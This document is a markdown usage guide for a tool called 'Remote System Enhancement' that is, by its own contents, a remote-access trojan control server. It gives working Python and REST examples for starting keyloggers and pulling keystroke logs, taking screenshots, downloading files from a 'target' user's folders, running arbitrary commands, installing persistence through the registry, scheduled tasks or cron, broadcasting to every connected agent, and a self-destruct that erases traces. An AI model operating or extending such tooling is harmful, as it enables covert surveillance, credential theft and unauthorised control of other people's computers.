# Usage Guide

This guide provides examples and instructions for common operations with the Remote System Enhancement platform.

## Table of Contents

- [Starting the Server](#starting-the-server)
- [Web Interface](#web-interface)
- [Agent Management](#agent-management)
- [File Transfer](#file-transfer)
- [Screenshot Capture](#screenshot-capture)
- [Keylogger Operations](#keylogger-operations)
- [Command Execution](#command-execution)
- [Persistence Management](#persistence-management)
- [Lifecycle Control](#lifecycle-control)
- [REST API Usage](#rest-api-usage)

## Starting the Server

### Basic Server Start

```bash
python -m remote_system.enhanced_server.enhanced_server
```

### Server with Custom Configuration

```bash
python -m remote_system.enhanced_server.enhanced_server \
  --config ./config/production.json \
  --log-level DEBUG
```

### Server Options

- `--config`: Path to configuration file
- `--host`: Bind address (default: 0.0.0.0)
- `--port`: Agent connection port (default: 9999)
- `--web-port`: Web UI port (default: 8080)
- `--log-level`: Logging level (DEBUG, INFO, WARNING, ERROR)
- `--no-tls`: Disable TLS encryption (not recommended)

## Web Interface

### Accessing the Web UI

1. Open browser to `http://localhost:8080`
2. Login with credentials from configuration
3. Default credentials (change immediately):
   - Username: `admin`
   - Password: `admin`

### Web UI Features

**Dashboard**
- View all connected agents
- Real-time status updates
- Agent statistics and metrics

**Agent Details**
- System information
- Connection history
- Command history
- Active plugins

**Command Execution**
- Execute commands on selected agents
- View real-time results
- Command history with filtering

**File Management**
- Browse agent file systems
- Upload/download files
- Transfer progress tracking

## Agent Management

### Viewing Active Agents

**Web UI**: Navigate to Dashboard

**CLI**:
```bash
python -m remote_system.enhanced_server.cli agents list
```

**Python API**:
```python
from remote_system.enhanced_server.enhanced_server import EnhancedServer

server = EnhancedServer(host="0.0.0.0", port=9999, db_path="./data/remote_system.db")
agents = server.get_active_agents()

for agent in agents:
    print(f"{agent.agent_id}: {agent.hostname} ({agent.os_type})")
```

### Agent Information

View detailed agent information:

```python
agent_info = server.get_agent_info(agent_id)
print(f"Hostname: {agent_info.hostname}")
print(f"Username: {agent_info.username}")
print(f"OS: {agent_info.os_type} {agent_info.os_version}")
print(f"IP: {agent_info.ip_address}")
print(f"Capabilities: {', '.join(agent_info.capabilities)}")
```

### Broadcasting Commands

Send command to multiple agents:

**Web UI**: Select multiple agents, click "Broadcast Command"

**Python API**:
```python
results = server.broadcast_command(
    command="systeminfo",
    agent_ids=["agent-1", "agent-2", "agent-3"]
)

for agent_id, result in results.items():
    print(f"{agent_id}: {result.status}")
```

## File Transfer

### Upload File to Agent

**Web UI**: 
1. Select agent
2. Navigate to "Files" tab
3. Click "Upload"
4. Select file and destination path

**Python API**:
```python
command = {
    "plugin": "file_transfer",
    "action": "upload",
    "args": {
        "local_path": "./files/update.exe",
        "remote_path": "C:\\Temp\\update.exe"
    }
}

result = server.send_command(agent_id, command)
if result.success:
    print(f"Uploaded {result.data['bytes_transferred']} bytes")
    print(f"Checksum: {result.data['checksum']}")
```

### Download File from Agent

**Python API**:
```python
command = {
    "plugin": "file_transfer",
    "action": "download",
    "args": {
        "remote_path": "C:\\Users\\target\\document.pdf",
        "local_path": "./downloads/document.pdf"
    }
}

result = server.send_command(agent_id, command)
if result.success:
    print(f"Downloaded {result.data['bytes_transferred']} bytes")
```

### List Directory

```python
command = {
    "plugin": "file_transfer",
    "action": "list_directory",
    "args": {
        "path": "C:\\Users\\target\\Documents"
    }
}

result = server.send_command(agent_id, command)
for file_info in result.data:
    print(f"{file_info['name']}: {file_info['size']} bytes")
```

### Resume Interrupted Transfer

Transfers automatically resume from the last successful chunk if interrupted. No special action required.

## Screenshot Capture

### Capture Full Screen

**Web UI**: Select agent → Click "Screenshot"

**Python API**:
```python
command = {
    "plugin": "screenshot",
    "action": "capture_screenshot",
    "args": {
        "quality": 85,
        "format": "PNG"
    }
}

result = server.send_command(agent_id, command)
if result.success:
    # Save screenshot
    with open("screenshot.png", "wb") as f:
        f.write(result.data)
```

### Capture Screen Region

```python
command = {
    "plugin": "screenshot",
    "action": "capture_region",
    "args": {
        "x": 0,
        "y": 0,
        "width": 1920,
        "height": 1080,
        "quality": 90,
        "format": "JPEG"
    }
}

result = server.send_command(agent_id, command)
```

### Get Screen Information

```python
command = {
    "plugin": "screenshot",
    "action": "get_screen_info"
}

result = server.send_command(agent_id, command)
print(f"Monitors: {result.data['monitor_count']}")
print(f"Resolution: {result.data['width']}x{result.data['height']}")
```

## Keylogger Operations

### Start Keylogger

```python
command = {
    "plugin": "keylogger",
    "action": "start_logging",
    "args": {
        "buffer_size": 1000
    }
}

result = server.send_command(agent_id, command)
if result.success:
    print("Keylogger started")
```

### Retrieve Logs

```python
command = {
    "plugin": "keylogger",
    "action": "get_logs",
    "args": {
        "clear_buffer": True
    }
}

result = server.send_command(agent_id, command)
for event in result.data:
    print(f"[{event['timestamp']}] {event['window']}: {event['key']}")
```

### Stop Keylogger

```python
command = {
    "plugin": "keylogger",
    "action": "stop_logging"
}

result = server.send_command(agent_id, command)
```

### Check Keylogger Status

```python
command = {
    "plugin": "keylogger",
    "action": "is_running"
}

result = server.send_command(agent_id, command)
print(f"Keylogger running: {result.data}")
```

## Command Execution

### Execute System Command

```python
command = {
    "plugin": "executor",
    "action": "execute_command",
    "args": {
        "command": "ipconfig /all",
        "timeout": 30
    }
}

result = server.send_command(agent_id, command)
print(f"Exit code: {result.data['exit_code']}")
print(f"Output:\n{result.data['stdout']}")
if result.data['stderr']:
    print(f"Errors:\n{result.data['stderr']}")
```

### Execute with Custom Timeout

```python
command = {
    "plugin": "executor",
    "action": "execute_command",
    "args": {
        "command": "long-running-task.exe",
        "timeout": 600  # 10 minutes
    }
}
```

## Persistence Management

### Install Persistence

```python
command = {
    "plugin": "persistence",
    "action": "install_persistence",
    "args": {
        "method": "auto"  # Automatically choose best method
    }
}

result = server.send_command(agent_id, command)
if result.success:
    print(f"Installed methods: {result.data['methods']}")
```

### Install Specific Method

```python
# Windows: Registry
command = {
    "plugin": "persistence",
    "action": "install_persistence",
    "args": {
        "method": "registry"
    }
}

# Windows: Scheduled Task
command = {
    "plugin": "persistence",
    "action": "install_persistence",
    "args": {
        "method": "scheduled_task"
    }
}

# Linux: Cron
command = {
    "plugin": "persistence",
    "action": "install_persistence",
    "args": {
        "method": "cron"
    }
}
```

### Check Persistence Status

```python
command = {
    "plugin": "persistence",
    "action": "check_persistence"
}

result = server.send_command(agent_id, command)
print(f"Installed: {result.data['installed']}")
print(f"Methods: {result.data['methods']}")
```

### Remove Persistence

```python
command = {
    "plugin": "persistence",
    "action": "remove_persistence"
}

result = server.send_command(agent_id, command)
```

## Lifecycle Control

### Temporary Disconnect

Disconnect agent for specified duration:

```python
command = {
    "plugin": "lifecycle",
    "action": "temporary_disconnect",
    "args": {
        "delay": 3600  # Reconnect after 1 hour
    }
}

result = server.send_command(agent_id, command)
```

### Stop Until Reboot

```python
command = {
    "plugin": "lifecycle",
    "action": "stop_until_reboot"
}

result = server.send_command(agent_id, command)
```

### Remote Uninstall

**Important**: Requires password authentication

```python
command = {
    "plugin": "lifecycle",
    "action": "remote_uninstall",
    "args": {
        "password": "your_uninstall_password"
    }
}

result = server.send_command(agent_id, command)
```

### Self-Destruct

**Warning**: Permanently removes agent and all traces

```python
command = {
    "plugin": "lifecycle",
    "action": "self_destruct",
    "args": {
        "password": "your_uninstall_password",
        "confirm": True
    }
}

result = server.send_command(agent_id, command)
```

## REST API Usage

### Authentication

```python
import requests

# Login
response = requests.post("http://localhost:8080/api/auth/login", json={
    "username": "admin",
    "password": "admin"
})
token = response.json()["token"]

# Use token in subsequent requests
headers = {"Authorization": f"Bearer {token}"}
```

### Get Agent List

```python
response = requests.get(
    "http://localhost:8080/api/agents",
    headers=headers
)
agents = response.json()
```

### Send Command

```python
response = requests.post(
    f"http://localhost:8080/api/agents/{agent_id}/command",
    headers=headers,
    json={
        "plugin": "screenshot",
        "action": "capture_screenshot",
        "args": {"quality": 85}
    }
)
result = response.json()
```

### Get Command History

```python
response = requests.get(
    f"http://localhost:8080/api/agents/{agent_id}/history",
    headers=headers,
    params={
        "limit": 50,
        "status": "success"
    }
)
history = response.json()
```

### Broadcast Command

```python
response = requests.post(
    "http://localhost:8080/api/agents/broadcast",
    headers=headers,
    json={
        "agent_ids": ["agent-1", "agent-2"],
        "command": {
            "plugin": "systeminfo",
            "action": "get_system_info"
        }
    }
)
results = response.json()
```

## Advanced Usage

### Custom Plugin Execution

```python
command = {
    "plugin": "custom_plugin_name",
    "action": "custom_action",
    "args": {
        "param1": "value1",
        "param2": "value2"
    }
}

result = server.send_command(agent_id, command)
```

### Monitoring Agent Status

```python
import time

while True:
    agents = server.get_active_agents()
    print(f"Active agents: {len(agents)}")
    
    for agent in agents:
        last_seen = (datetime.now() - agent.last_seen).seconds
        print(f"  {agent.hostname}: {last_seen}s ago")
    
    time.sleep(60)
```

### Batch Operations

```python
# Execute command on all agents
agents = server.get_active_agents()
agent_ids = [agent.agent_id for agent in agents]

results = server.broadcast_command(
    command="systeminfo",
    agent_ids=agent_ids
)

# Process results
for agent_id, result in results.items():
    if result.success:
        print(f"{agent_id}: Success")
    else:
        print(f"{agent_id}: Failed - {result.error}")
```

## Troubleshooting

### Command Timeout

Increase timeout for long-running commands:
```python
command = {
    "plugin": "executor",
    "action": "execute_command",
    "args": {
        "command": "long-task.exe",
        "timeout": 1800  # 30 minutes
    }
}
```

### Agent Not Responding

Check agent status and last seen time:
```python
agent_info = server.get_agent_info(agent_id)
print(f"Status: {agent_info.status}")
print(f"Last seen: {agent_info.last_seen}")
```

### File Transfer Failed

Check logs and retry with smaller chunk size:
```python
command = {
    "plugin": "file_transfer",
    "action": "upload",
    "args": {
        "local_path": "./large_file.zip",
        "remote_path": "C:\\Temp\\large_file.zip",
        "chunk_size": 4096  # Smaller chunks for unstable connections
    }
}
```

## Best Practices

1. **Always use TLS encryption** in production environments
2. **Change default passwords** immediately after installation
3. **Monitor agent status** regularly to detect disconnections
4. **Use appropriate timeouts** for different command types
5. **Verify file transfers** using checksums
6. **Test commands** on a single agent before broadcasting
7. **Keep logs** for audit and troubleshooting purposes
8. **Backup database** regularly

## Next Steps

- Review [API.md](API.md) for complete API reference
- Learn about [PLUGINS.md](PLUGINS.md) for custom plugin development
- Follow [SECURITY.md](SECURITY.md) for security best practices
